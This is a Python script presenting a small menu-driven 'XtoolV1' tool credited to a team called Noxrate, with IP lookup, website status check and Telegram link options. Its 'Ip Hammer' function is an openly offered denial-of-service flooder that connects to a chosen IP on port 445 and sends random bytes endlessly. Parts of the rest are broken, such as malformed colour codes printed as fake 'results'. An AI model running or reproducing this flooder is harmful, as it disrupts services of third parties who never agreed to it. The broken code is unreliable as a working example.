import os
import webbrowser
import time
import sys
from colorama import init,Fore
import socket
import requests
import random

def ipinfo():
   ip = input("İp: ")
   url="https://ipinfo.io"
   pyload={'ip':ip}
   ip_yolla = requests.post(url=url,json=pyload)
   if ip_yolla.status_code == 200:
      print(f"Result = {ip_yolla.text} ")
   else:
      print("Failed ")

def ip_hammer():
   ip2 = input("Web İp: ")
   hammer = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   hammer.connect((ip2,445))
   byte = random._urandom(50000)
   while True:
      hammer.send(byte)
      print(Fore.RED + "Sending ")

def web_status():
   A = "\11[1;90m"
   B = "\22[1;91m"
   C = "\33[1;92m"
   D = "\44[1;93m"
   E = "\55[1;94m"
   F = "\66[1;95m"
   G = "\77[1;96m"
   H = "\70[1;97m"

   url2 = input("Url: ")
   static = requests.get(url2)
   print("Checking Web Status")
   time.sleep(5)
   if static.status_code == 200:
      print("Results: \n")
      time.sleep(5)
      print(A)
      print(B)
      print(C)
      print(D)
      print(E)
      print(F)
      print(G)
      print(H)
      print("Web Status: Open")
   else:
      time.sleep(5)
      print("Web Status: Close")

def noxrate():
   webbrowser.open("t.me/noxrate")
init(autoreset=True)

os.system("clear")
print(Fore.RED + """
               _  _ ______            __
              | |/ /_  __/___  ____  / /
              |   / / / / __ \/ __ \/ /
             /   | / / / /_/ / /_/ / /
            /_/|_|/_/  \____/\____/_/
                           """)
print(Fore.GREEN + "                                      XtoolV1")
print(Fore.BLUE +   "     Code = Xsaver ")
print(Fore.BLUE +   "     Team = Noxrate ")

print(Fore.CYAN + "     [1]Ipinfo ")
print(Fore.CYAN + "     [2]Ip Hammer ")
print(Fore.CYAN + "     [3]Web Status ")
print(Fore.CYAN + "     [4]Open Noxrate ")
print(Fore.CYAN + "     [5]Exit ")

select = int(input("Select: "))
if select == 1:
   ipinfo()
elif select == 2:
   ip_hammer()
elif select == 3:
   web_status()
elif select == 4:
   noxrate()
elif select == 5:
   print("Finish ")
else:
   print("Fail ")
